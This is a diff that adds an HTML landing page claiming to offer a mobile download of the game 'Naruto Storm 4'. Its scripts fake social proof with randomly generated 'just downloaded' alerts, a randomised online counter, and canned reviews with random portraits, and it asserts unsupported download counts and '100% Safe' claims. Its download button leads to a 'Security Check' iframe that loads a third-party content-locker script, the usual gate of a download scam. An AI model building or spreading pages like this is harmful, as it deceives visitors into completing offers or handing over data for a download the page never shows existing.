@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Naruto Storm 4 Mobile | Download for Android & iOS</title>
+    <link href="https://fonts.googleapis.com/css2?family=Bangers&family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: #0a0a0a;
+            color: white;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* خلفية ناروتو - تأثير الشاكرا */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 20% 20%, #1a1a2e, #0a0a0a 90%);
+            z-index: -2;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.05"><path fill="%23ff6600" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/></svg>') repeat;
+            background-size: 150px;
+            pointer-events: none;
+            z-index: -1;
+            animation: rotate 60s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        /* تأثير النينجا */
+        .ninja-stars {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            font-size: 2rem;
+            color: #ff6600;
+            opacity: 0.3;
+            animation: spinStar 4s linear infinite;
+            z-index: 10;
+        }
+
+        @keyframes spinStar {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        /* الهيدر */
+        .header {
+            background: linear-gradient(rgba(0,0,0,0.9), rgba(255, 102, 0, 0.7)), url('https://i.pinimg.com/736x/8a/7c/8b/8a7c8b8b8b8b8b8b8b8b8b8b8b8b8b8b.jpg');
+            background-size: cover;
+            background-position: center;
+            height: 260px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            position: relative;
+            border-bottom: 4px solid #ff6600;
+        }
+
+        .header h1 {
+            font-family: 'Bangers', cursive;
+            font-size: 3.5rem;
+            text-transform: uppercase;
+            text-shadow: 3px 3px 0 #ff6600, 6px 6px 0 #000;
+            letter-spacing: 2px;
+        }
+
+        .header h1 span {
+            color: #ff6600;
+            font-family: 'Bangers', cursive;
+        }
+
+        .header p {
+            color: #ffcc00;
+            font-size: 1rem;
+            font-weight: 600;
+            text-shadow: 1px 1px 0 #000;
+        }
+
+        .ninja-badge {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.7);
+            padding: 5px 12px;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            border: 1px solid #ff6600;
+            color: #ffcc00;
+        }
+
+        /* أزرار اللغة */
+        .lang-selector {
+            position: fixed;
+            top: 70px;
+            right: 15px;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 5px;
+            border: 1px solid #ff6600;
+            z-index: 1000;
+            display: flex;
+            gap: 5px;
+        }
+
+        .lang-btn {
+            background: transparent;
+            border: none;
+            color: #aaa;
+            padding: 8px 15px;
+            border-radius: 25px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .lang-btn.active {
+            background: #ff6600;
+            color: black;
+        }
+
+        /* الإشعارات */
+        .top-notif {
+            position: fixed;
+            top: 10px;
+            left: 15px;
+            right: 15px;
+            background: rgba(255, 102, 0, 0.9);
+            backdrop-filter: blur(10px);
+            padding: 12px 20px;
+            border-radius: 50px;
+            border: 1px solid #ffcc00;
+            z-index: 999;
+            font-size: 0.9rem;
+            animation: slideDown 0.5s;
+            box-shadow: 0 0 20px rgba(255, 102, 0, 0.5);
+        }
+
+        .top-notif i {
+            color: #000;
+            margin-right: 10px;
+        }
+
+        @keyframes slideDown {
+            from { top: -50px; opacity: 0; }
+            to { top: 10px; opacity: 1; }
+        }
+
+        /* المحتوى الرئيسي */
+        .container {
+            padding: 20px 20px 100px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .gallery-title {
+            font-family: 'Bangers', cursive;
+            font-size: 2.5rem;
+            margin: 30px 0 20px;
+            text-align: center;
+            color: #ff6600;
+            text-shadow: 2px 2px 0 #000;
+        }
+
+        .gallery {
+            display: flex;
+            gap: 15px;
+            overflow-x: auto;
+            padding-bottom: 15px;
+            scrollbar-width: none;
+        }
+
+        .gallery::-webkit-scrollbar {
+            display: none;
+        }
+
+        .gallery img {
+            width: 280px;
+            height: 160px;
+            object-fit: cover;
+            border-radius: 15px;
+            border: 3px solid #ff6600;
+            box-shadow: 0 0 20px rgba(255, 102, 0, 0.5);
+            transition: 0.3s;
+        }
+
+        .gallery img:hover {
+            transform: scale(1.05);
+            border-color: #ffcc00;
+        }
+
+        /* المميزات */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .feature {
+            background: rgba(255, 102, 0, 0.1);
+            border: 2px solid #ff6600;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            backdrop-filter: blur(5px);
+            transition: 0.3s;
+        }
+
+        .feature:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 30px rgba(255, 102, 0, 0.3);
+        }
+
+        .feature i {
+            font-size: 2rem;
+            color: #ff6600;
+            margin-bottom: 10px;
+        }
+
+        .feature h4 {
+            font-size: 1rem;
+            margin-bottom: 5px;
+            color: #ffcc00;
+        }
+
+        .feature p {
+            font-size: 0.8rem;
+            color: #ccc;
+        }
+
+        /* الإحصائيات */
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            padding: 20px;
+            background: rgba(255, 102, 0, 0.1);
+            border: 1px solid #ff6600;
+            border-radius: 15px;
+            margin: 20px 0;
+        }
+
+        .stats i {
+            color: #ffcc00;
+            margin-right: 5px;
+        }
+
+        /* التقييمات */
+        .reviews-title {
+            font-family: 'Bangers', cursive;
+            font-size: 2.5rem;
+            text-align: center;
+            margin: 40px 0 20px;
+            color: #ff6600;
+            text-shadow: 2px 2px 0 #000;
+        }
+
+        .review {
+            background: rgba(255, 102, 0, 0.1);
+            border: 2px solid #ff6600;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+
+        .review-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+
+        .review-header img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 2px solid #ff6600;
+        }
+
+        .review-name {
+            font-weight: 600;
+            color: #ffcc00;
+        }
+
+        .review-device {
+            font-size: 0.8rem;
+            color: #aaa;
+        }
+
+        .review-stars {
+            color: gold;
+        }
+
+        /* الضمانات */
+        .guarantees-section {
+            display: flex;
+            gap: 12px;
+            margin: 30px 0;
+            padding: 15px;
+            background: rgba(255, 102, 0, 0.1);
+            border-radius: 15px;
+            border: 1px solid #ff6600;
+        }
+
+        .guarantee-item {
+            flex: 1;
+            text-align: center;
+        }
+
+        .guarantee-item i {
+            color: #ff6600;
+            font-size: 1.2rem;
+        }
+
+        .guarantee-item span {
+            font-size: 0.65rem;
+            color: #ccc;
+            display: block;
+            margin-top: 3px;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px 0;
+            border-top: 1px solid #ff6600;
+            margin-top: 20px;
+            color: #666;
+            font-size: 0.8rem;
+        }
+
+        /* زر التحميل العائم */
+        .floating-btn {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            max-width: 400px;
+            background: linear-gradient(135deg, #ff6600, #ffcc00);
+            color: #000;
+            border: none;
+            border-radius: 15px;
+            padding: 18px;
+            font-size: 1.1rem;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 10px 30px rgba(255, 102, 0, 0.5);
+            cursor: pointer;
+            z-index: 900;
+            animation: pulse 2s infinite;
+            text-transform: uppercase;
+        }
+
+        @keyframes pulse {
+            0% { transform: translateX(-50%) scale(1); }
+            50% { transform: translateX(-50%) scale(1.05); }
+            100% { transform: translateX(-50%) scale(1); }
+        }
+
+        /* المودال */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.98);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            padding: 10px;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: #1a1a2e;
+            width: 100%;
+            max-width: 380px;
+            border-radius: 20px;
+            padding: 20px;
+            position: relative;
+            max-height: 95vh;
+            overflow-y: auto;
+            border: 3px solid #ff6600;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.5);
+            border: none;
+            color: #ff6600;
+            font-size: 1rem;
+            cursor: pointer;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-title {
+            text-align: center;
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+            color: #ff6600;
+            font-family: 'Bangers', cursive;
+        }
+
+        .trust-section {
+            display: flex;
+            justify-content: space-between;
+            margin: 15px 0;
+            padding: 10px;
+            background: rgba(255, 102, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .trust-item {
+            text-align: center;
+        }
+
+        .trust-item i {
+            color: #ffcc00;
+        }
+
+        .trust-item span {
+            font-size: 0.65rem;
+            display: block;
+        }
+
+        /* اختيار الجهاز */
+        .device-selector {
+            display: flex;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .device-card {
+            flex: 1;
+            background: #2a2a3e;
+            border: 2px solid #ff6600;
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .device-card.active {
+            background: linear-gradient(135deg, #ff6600, #ffcc00);
+            border-color: #fff;
+        }
+
+        .device-card i {
+            font-size: 2rem;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .device-card.android i {
+            color: #a4c639;
+        }
+
+        .device-card.ios i {
+            color: white;
+        }
+
+        /* Locker */
+        .locker-wrapper {
+            margin-top: 20px;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 2px solid #ff6600;
+            background: #1a1a2e;
+        }
+
+        .locker-header {
+            background: linear-gradient(90deg, #ff6600, #ffcc00);
+            padding: 12px 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .locker-header i, .locker-header span {
+            color: black;
+            font-weight: 600;
+        }
+
+        .locker-header .badge {
+            background: rgba(0,0,0,0.2);
+            padding: 3px 8px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            margin-left: auto;
+        }
+
+        .locker-frame {
+            height: 350px;
+            background: white;
+        }
+
+        .locker-frame iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        .locker-footer {
+            background: #1a1a2e;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            border-top: 1px solid #ff6600;
+        }
+
+        .device-message, .initial-message {
+            text-align: center;
+            margin: 10px 0;
+        }
+
+        .initial-message {
+            color: #aaa;
+            font-size: 0.9rem;
+        }
+
+        .device-message {
+            color: #ffcc00;
+            display: none;
+        }
+
+        .live-counter {
+            position: fixed;
+            bottom: 100px;
+            left: 15px;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+            padding: 6px 12px;
+            border-radius: 30px;
+            font-size: 0.75rem;
+            border: 1px solid #ff6600;
+            z-index: 800;
+        }
+
+        /* رسالة الصوت */
+        .sound-status {
+            position: fixed;
+            bottom: 160px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(10px);
+            padding: 10px 20px;
+            border-radius: 50px;
+            border: 1px solid #ff6600;
+            color: #ffcc00;
+            font-size: 0.8rem;
+            z-index: 1001;
+            display: none;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .sound-status.active {
+            display: flex;
+        }
+    </style>
+</head>
+<body>
+    <!-- الأصوات من عالم ناروتو -->
+    <audio id="sound1" preload="auto"><source src="https://www.myinstants.com/media/sounds/naruto-rasengan-sound.mp3" type="audio/mpeg"></audio>
+    <audio id="sound2" preload="auto"><source src="https://www.myinstants.com/media/sounds/sasuke-chidori-sound.mp3" type="audio/mpeg"></audio>
+    <audio id="sound3" preload="auto"><source src="https://www.myinstants.com/media/sounds/naruto-shadow-clone-sound.mp3" type="audio/mpeg"></audio>
+    <audio id="sound4" preload="auto"><source src="https://www.myinstants.com/media/sounds/naruto-ultimateninja-impact-menu-sound.mp3" type="audio/mpeg"></audio>
+    <audio id="sound5" preload="auto"><source src="https://www.myinstants.com/media/sounds/ninja-war-sound.mp3" type="audio/mpeg"></audio>
+
+    <div class="sound-status" id="soundStatus">
+        <i class="fas fa-dharmachakra"></i>
+        <span>Sound effects activated - Believe it!</span>
+    </div>
+
+    <div class="lang-selector">
+        <button class="lang-btn active" onclick="changeLang('en'); playSound()">🇬🇧 EN</button>
+        <button class="lang-btn" onclick="changeLang('ar'); playSound()">🇸🇦 AR</button>
+        <button class="lang-btn" onclick="changeLang('fr'); playSound()">🇫🇷 FR</button>
+        <button class="lang-btn" onclick="changeLang('es'); playSound()">🇪🇸 ES</button>
+    </div>
+
+    <div class="top-notif" id="notification">
+        <i class="fas fa-fist-raised"></i>
+        <span id="notificationText">Naruto_Fan_7 just downloaded</span>
+    </div>
+
+    <div class="live-counter">
+        <i class="fas fa-eye"></i> <span id="counterText">1,248 ninjas online</span>
+    </div>
+
+    <div class="header">
+        <div>
+            <h1>Naruto <span>Storm 4</span></h1>
+            <p id="headerSubtitle">Mobile - Ultimate Ninja Battle</p>
+        </div>
+        <div class="ninja-badge">
+            <i class="fas fa-fist-raised"></i> Shinobi Mode
+        </div>
+    </div>
+
+    <div class="container">
+        <h2 class="gallery-title" id="galleryTitle">⚡ Game Gallery ⚡</h2>
+        <div class="gallery">
+            <img src="https://i.ytimg.com/vi/8qsumch7S_s/maxresdefault.jpg" onerror="this.src='https://via.placeholder.com/280x160/ff6600/000?text=Naruto+vs+Sasuke'">
+            <img src="https://i.ytimg.com/vi/CNTf5JOCuCE/maxresdefault.jpg" onerror="this.src='https://via.placeholder.com/280x160/ff6600/000?text=Team+7'">
+            <img src="https://i.pinimg.com/1200x/b3/cd/c9/b3cdc9fb37ac8dee4bf428dff3453467.jpg" onerror="this.src='https://via.placeholder.com/280x160/ff6600/000?text=Ninja+Battle'">
+            <img src="https://media.gq.com/photos/5a5f9b7b8d5f0c3777b0b3b3/16:9/w_2560%2Cc_limit/gta-5.jpg" onerror="this.src='https://via.placeholder.com/280x160/ff6600/000?text=Ultimate+Jutsu'">
+        </div>
+
+        <div class="features">
+            <div class="feature">
+                <i class="fas fa-fist-raised"></i>
+                <h4 id="f1t">Full Roster</h4>
+                <p id="f1d">120+ Shinobi</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-bolt"></i>
+                <h4 id="f2t">Ultimate Jutsu</h4>
+                <p id="f2d">Epic attacks</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-users"></i>
+                <h4 id="f3t">Online Battle</h4>
+                <p id="f3d">PvP mode</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-map"></i>
+                <h4 id="f4t">Story Mode</h4>
+                <p id="f4d">Naruto's journey</p>
+            </div>
+        </div>
+
+        <div class="stats">
+            <span><i class="fas fa-download"></i> <span id="stat1">5M+ Downloads</span></span>
+            <span><i class="fas fa-star"></i> <span id="stat2">4.9 Rating</span></span>
+            <span><i class="fas fa-trophy"></i> <span id="stat3">#1 Anime Game</span></span>
+        </div>
+
+        <div id="reviews"></div>
+
+        <div class="guarantees-section">
+            <div class="guarantee-item"><i class="fas fa-shield-alt"></i><span id="g1">100% Safe</span></div>
+            <div class="guarantee-item"><i class="fas fa-headset"></i><span id="g2">Support 24/7</span></div>
+            <div class="guarantee-item"><i class="fas fa-gem"></i><span id="g3">Free Updates</span></div>
+        </div>
+
+        <footer>
+            <span id="footerPrivacy">Privacy Policy</span> | <span id="footerTerms">Terms</span>
+        </footer>
+    </div>
+
+    <button class="floating-btn" onclick="openModal(); playSound()">
+        <i class="fas fa-download"></i> <span id="btnText">Download Now</span>
+    </button>
+
+    <div class="modal" id="modal">
+        <div class="modal-content">
+            <button class="close-modal" onclick="closeModal(); playSound()">✖</button>
+            <h3 class="modal-title">🔒 Choose your weapon</h3>
+            
+            <div class="trust-section">
+                <div class="trust-item"><i class="fas fa-shield-alt"></i><span>Secure</span></div>
+                <div class="trust-item"><i class="fas fa-lock"></i><span>Encrypted</span></div>
+                <div class="trust-item"><i class="fas fa-dharmachakra"></i><span>Trusted</span></div>
+            </div>
+
+            <div class="device-selector">
+                <div class="device-card android" onclick="selectDevice('android'); playSound()" id="androidCard">
+                    <i class="fab fa-android"></i><span>Android</span>
+                </div>
+                <div class="device-card ios" onclick="selectDevice('ios'); playSound()" id="iosCard">
+                    <i class="fab fa-apple"></i><span>iPhone</span>
+                </div>
+            </div>
+
+            <div class="initial-message" id="initialMsg">⚡ Select your device to start ⚡</div>
+            <div class="device-message" id="deviceMsg"><i class="fas fa-check-circle"></i> Device selected: <span id="selectedDevice"></span></div>
+
+            <div id="lockerContainer" style="display: none;">
+                <div class="locker-wrapper">
+                    <div class="locker-header">
+                        <i class="fas fa-shield-alt"></i><span>Security Check</span>
+                        <div class="badge">Shinobi protected</div>
+                    </div>
+                    <div class="locker-frame">
+                        <iframe id="lockerIframe" src="about:blank"></iframe>
+                    </div>
+                    <div class="locker-footer">
+                        <span><i class="fas fa-shield-alt"></i> Encrypted</span>
+                        <span><i class="fas fa-fist-raised"></i> Ninja Secure</span>
+                    </div>
+                </div>
+                <div class="stats-message" style="background:#ff660022; padding:12px; border-radius:12px; margin-top:15px; text-align:center;">
+                    <div style="font-size:2rem; font-weight:bold; color:#ffcc00;">98%</div>
+                    <div>of ninjas complete verification</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="ninja-stars">
+        <i class="fas fa-star-of-life"></i>
+    </div>
+
+    <script>
+        let soundEnabled = false;
+        const sounds = [sound1, sound2, sound3, sound4, sound5].filter(s => s);
+        let lastSound = -1;
+
+        function playSound() {
+            if (!soundEnabled) {
+                soundEnabled = true;
+                document.getElementById('soundStatus').classList.add('active');
+                setTimeout(() => document.getElementById('soundStatus').classList.remove('active'), 2000);
+            }
+            let idx;
+            do { idx = Math.floor(Math.random() * sounds.length); } while (idx === lastSound && sounds.length > 1);
+            lastSound = idx;
+            const snd = sounds[idx];
+            if (snd) { snd.currentTime = 0; snd.play().catch(() => {}); }
+        }
+
+        const translations = {
+            en: {
+                headerSubtitle: "Mobile - Ultimate Ninja Battle",
+                galleryTitle: "⚡ Game Gallery ⚡",
+                f1t: "Full Roster", f1d: "120+ Shinobi",
+                f2t: "Ultimate Jutsu", f2d: "Epic attacks",
+                f3t: "Online Battle", f3d: "PvP mode",
+                f4t: "Story Mode", f4d: "Naruto's journey",
+                stat1: "5M+ Downloads", stat2: "4.9 Rating", stat3: "#1 Anime Game",
+                g1: "100% Safe", g2: "Support 24/7", g3: "Free Updates",
+                footerPrivacy: "Privacy Policy", footerTerms: "Terms",
+                btnText: "Download Now",
+                notification: "just downloaded",
+                counter: "ninjas online"
+            },
+            ar: {
+                headerSubtitle: "للهواتف - معركة النينجا النهائية",
+                galleryTitle: "⚡ معرض اللعبة ⚡",
+                f1t: "جميع الشخصيات", f1d: "+120 نينجا",
+                f2t: "الحركات النهائية", f2d: "هجمات خارقة",
+                f3t: "معارك أونلاين", f3d: "وضع PvP",
+                f4t: "وضع القصة", f4d: "رحلة ناروتو",
+                stat1: "+5M تحميل", stat2: "4.9 تقييم", stat3: "#1 لعبة أنمي",
+                g1: "آمن 100%", g2: "دعم 24/7", g3: "تحديثات مجانية",
+                footerPrivacy: "الخصوصية", footerTerms: "الشروط",
+                btnText: "حمل الآن",
+                notification: "قام بالتحميل",
+                counter: "نينجا متصل"
+            },
+            fr: {
+                headerSubtitle: "Mobile - Bataille Ninja Ultime",
+                galleryTitle: "⚡ Galerie ⚡",
+                f1t: "Personnages complets", f1d: "120+ Shinobi",
+                f2t: "Jutsu Ultime", f2d: "Attaques épiques",
+                f3t: "Combat en ligne", f3d: "Mode PvP",
+                f4t: "Mode Histoire", f4d: "Le voyage de Naruto",
+                stat1: "5M+ Téléch.", stat2: "4.9 Note", stat3: "#1 Jeu Anime",
+                g1: "100% Sécurisé", g2: "Support 24/7", g3: "MàJ gratuites",
+                footerPrivacy: "Confidentialité", footerTerms: "Conditions",
+                btnText: "Télécharger",
+                notification: "vient de télécharger",
+                counter: "ninjas en ligne"
+            },
+            es: {
+                headerSubtitle: "Móvil - Batalla Ninja Definitiva",
+                galleryTitle: "⚡ Galería ⚡",
+                f1t: "Personajes completos", f1d: "120+ Shinobi",
+                f2t: "Jutsu Definitivo", f2d: "Ataques épicos",
+                f3t: "Batalla Online", f3d: "Modo PvP",
+                f4t: "Modo Historia", f4d: "Aventura de Naruto",
+                stat1: "5M+ Descargas", stat2: "4.9 Valoración", stat3: "#1 Anime Game",
+                g1: "100% Seguro", g2: "Soporte 24/7", g3: "Actualizaciones gratis",
+                footerPrivacy: "Privacidad", footerTerms: "Términos",
+                btnText: "Descargar",
+                notification: "acaba de descargar",
+                counter: "ninjas en línea"
+            }
+        };
+
+        let currentLang = 'en';
+        let selectedDevice = null;
+
+        function changeLang(lang) {
+            currentLang = lang;
+            const t = translations[lang];
+            document.getElementById('headerSubtitle').innerText = t.headerSubtitle;
+            document.getElementById('galleryTitle').innerText = t.galleryTitle;
+            document.getElementById('f1t').innerText = t.f1t; document.getElementById('f1d').innerText = t.f1d;
+            document.getElementById('f2t').innerText = t.f2t; document.getElementById('f2d').innerText = t.f2d;
+            document.getElementById('f3t').innerText = t.f3t; document.getElementById('f3d').innerText = t.f3d;
+            document.getElementById('f4t').innerText = t.f4t; document.getElementById('f4d').innerText = t.f4d;
+            document.getElementById('stat1').innerText = t.stat1; document.getElementById('stat2').innerText = t.stat2; document.getElementById('stat3').innerText = t.stat3;
+            document.getElementById('g1').innerText = t.g1; document.getElementById('g2').innerText = t.g2; document.getElementById('g3').innerText = t.g3;
+            document.getElementById('footerPrivacy').innerText = t.footerPrivacy; document.getElementById('footerTerms').innerText = t.footerTerms;
+            document.getElementById('btnText').innerText = t.btnText;
+            document.getElementById('counterText').innerHTML = `1,248 ${t.counter}`;
+            document.querySelectorAll('.lang-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.innerText.includes(lang.toUpperCase())) btn.classList.add('active');
+            });
+            updateNotif();
+            loadReviews();
+        }
+
+        const names = { en: ['Naruto', 'Sasuke', 'Kakashi', 'Sakura', 'Itachi', 'Madara', 'Minato', 'Jiraya'], ar: ['ناروتو', 'ساسكي', 'كاكاشي', 'ساكورا', 'ايتاشي', 'مادارا'], fr: ['Naruto', 'Sasuke', 'Kakashi', 'Sakura'], es: ['Naruto', 'Sasuke', 'Kakashi', 'Sakura'] };
+
+        function updateNotif() {
+            const list = names[currentLang] || names.en;
+            const name = list[Math.floor(Math.random() * list.length)];
+            const num = Math.floor(Math.random() * 9000);
+            document.getElementById('notificationText').innerHTML = `${name}_${num} ${translations[currentLang].notification}`;
+        }
+
+        function loadReviews() {
+            const revs = [
+                { name: 'Naruto_Uzumaki', stars: 5, text: 'Believe it! Best game ever!', device: 'S23 Ultra' },
+                { name: 'Sasuke_Uchiha', stars: 5, text: 'Ultimate Jutsu looks amazing!', device: 'iPhone 15' },
+                { name: 'Kakashi_Sensei', stars: 4, text: 'Great gameplay, smooth controls', device: 'Pixel 8' }
+            ];
+            let html = '<h2 class="reviews-title" id="reviewsTitle">⭐ Shinobi Reviews ⭐</h2>';
+            revs.forEach(r => {
+                html += `<div class="review"><div class="review-header"><img src="https://randomuser.me/api/portraits/men/${Math.floor(Math.random()*70)}.jpg"><div><div class="review-name">${r.name}</div><div class="review-device">${r.device} <span class="review-stars">★★★★★</span></div></div></div><div class="review-content">"${r.text}"</div></div>`;
+            });
+            document.getElementById('reviews').innerHTML = html;
+        }
+
+        function openModal() { document.getElementById('modal').classList.add('active'); resetModal(); }
+        function closeModal() { document.getElementById('modal').classList.remove('active'); document.getElementById('lockerIframe').src = 'about:blank'; }
+        function resetModal() { selectedDevice = null; document.getElementById('androidCard').classList.remove('active'); document.getElementById('iosCard').classList.remove('active'); document.getElementById('lockerContainer').style.display = 'none'; document.getElementById('deviceMsg').style.display = 'none'; document.getElementById('initialMsg').style.display = 'block'; }
+
+        function selectDevice(device) {
+            selectedDevice = device;
+            document.getElementById('androidCard').classList.remove('active');
+            document.getElementById('iosCard').classList.remove('active');
+            if (device === 'android') { document.getElementById('androidCard').classList.add('active'); document.getElementById('selectedDevice').innerText = 'Android'; }
+            else { document.getElementById('iosCard').classList.add('active'); document.getElementById('selectedDevice').innerText = 'iPhone'; }
+            document.getElementById('initialMsg').style.display = 'none';
+            document.getElementById('deviceMsg').style.display = 'block';
+            document.getElementById('lockerContainer').style.display = 'block';
+            document.getElementById('lockerIframe').src = 'https://d2xohqmdyl2cj3.cloudfront.net/public/locker.php?it=4321081&key=db20f';
+        }
+
+        setInterval(updateNotif, 5000);
+        setInterval(() => { let v = Math.floor(Math.random() * 300 + 1100); document.getElementById('counterText').innerHTML = `${v} ${translations[currentLang].counter}`; }, 8000);
+        window.onload = () => { changeLang('en'); loadReviews(); playSound(); };
+    </script>
+</body>
+</html>
